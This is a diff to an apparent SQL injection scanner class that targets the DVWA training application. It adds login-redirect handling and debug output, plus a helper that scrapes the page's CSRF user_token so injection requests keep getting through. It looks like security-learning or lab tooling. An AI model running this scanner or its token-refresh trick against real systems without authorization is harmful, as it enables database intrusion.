@@ -112,7 +112,23 @@ class SQLiInjector:
             response = self._send(ep, param, payload)
             if response is None:
                 continue
+
+            # Skip if redirected to login
+            if response.status_code in (301, 302, 303):
+                location = response.headers.get('Location', '')
+                if 'login' in location.lower():
+                    print(f"  [DEBUG] Session expired — redirected to login")
+                    return None
+                continue
+
             body = response.text.lower()
+
+            # Debug: show response snippet for sqli endpoint
+            if 'sqli' in ep['url'] and param == 'id':
+                snippet = response.text[200:500].replace('\n', ' ')
+                print(f"  [DEBUG] sqli/id payload='{payload}' "
+                      f"status={response.status_code} snippet={snippet}")
+
             for error in SQLI_ERRORS:
                 if error in body:
                     print(f"  [SQLi] ✓ Error-based SQLi: {ep['url']} "
@@ -181,27 +197,42 @@ class SQLiInjector:
 
     # ── HTTP helper ───────────────────────────────────────────────────────────
 
+    def _get_user_token(self, url: str) -> str:
+        """Fetch the page and extract the DVWA user_token CSRF value."""
+        try:
+            resp = self.session.get(
+                url, timeout=config.REQUEST_TIMEOUT, allow_redirects=False
+            )
+            from bs4 import BeautifulSoup
+            soup  = BeautifulSoup(resp.text, 'html.parser')
+            token = soup.find('input', {'name': 'user_token'})
+            return token['value'] if token else ''
+        except Exception:
+            return ''
+
     def _send(self, ep: dict, param: str,
               payload: str) -> requests.Response:
         """Send a request with the payload injected into param."""
-        params = dict(ep['params'])
+        clean_url = ep['url'].split('#')[0]
+        params    = dict(ep['params'])
         params[param] = payload
 
-        # Strip URL fragment (#...) — not sent to server
-        clean_url = ep['url'].split('#')[0]
+        # Refresh user_token if present in form (DVWA CSRF protection)
+        if 'user_token' in params:
+            params['user_token'] = self._get_user_token(clean_url)
 
         try:
             if ep['method'] == 'POST':
                 return self.session.post(
                     clean_url, data=params,
                     timeout=config.REQUEST_TIMEOUT + config.TIME_BASED_DELAY,
-                    allow_redirects=True
+                    allow_redirects=False
                 )
             else:
                 return self.session.get(
                     clean_url, params=params,
                     timeout=config.REQUEST_TIMEOUT + config.TIME_BASED_DELAY,
-                    allow_redirects=True
+                    allow_redirects=False
                 )
         except Exception:
             return None
